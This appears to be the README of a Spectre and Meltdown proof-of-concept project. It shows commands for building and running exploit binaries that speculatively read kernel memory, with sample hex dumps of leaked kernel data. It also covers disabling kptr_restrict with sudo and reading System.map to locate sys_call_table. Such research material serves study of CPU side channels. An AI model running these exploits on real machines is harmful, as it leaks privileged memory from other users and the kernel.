Spectre and Meltdown Proof-of-Concept
=====================================

Read kernel addresses by stalling the pipeline and speculatively hitting a cacheline:

```
$ make
...
$ grep ' sys_call_table' /proc/kallsyms
ffffffff8f800180 R sys_call_table

If the above shows something like:

0000000000000000 R sys_call_table you have two options, the first is something like
this:

$ sudo sh -c "echo 0  > /proc/sys/kernel/kptr_restrict"

which will enable kallsyms. Your other option is to simple read the syscall table
address from your System.map file, so something like this:

sudo cat /boot/System.map-4.8.0-53-generic  | grep sys_call_table

It seems silly to use root access to find the syscall table to run this exploit
(since with root access you could just read from memory), but this is just to get
this POC running with some interesting data coming back.

$ ./poc ffffffff8f800180
0xffffffff8f800180 | 10 40 23 8f ff ff ff ff d0 40 23 8f ff ff ff ff
0xffffffff8f800190 | c0 14 23 8f ff ff ff ff 60 f6 22 8f ff ff ff ff
0xffffffff8f8001a0 | 40 91 23 8f ff ff ff ff 70 91 23 8f ff ff ff ff
0xffffffff8f8001b0 | 50 91 23 8f ff ff ff ff 10 af 24 8f ff ff ff ff
...
```

![Motivational GIF](http://tcpst.net/unea.gif)

Read kernel addresses by poisoning the branch predictor and speculatively hitting a cacheline:
```
$ ./poc_poison ffffffff8f800180
cutoff: 192
0xffffffff8f800180 | 10 40 23 8f ff ff ff ff d0 40 23 8f ff ff ff ff
...
```

Visualize memory read timings:
```
$ ./poc_vis ffffffff8f800180
```
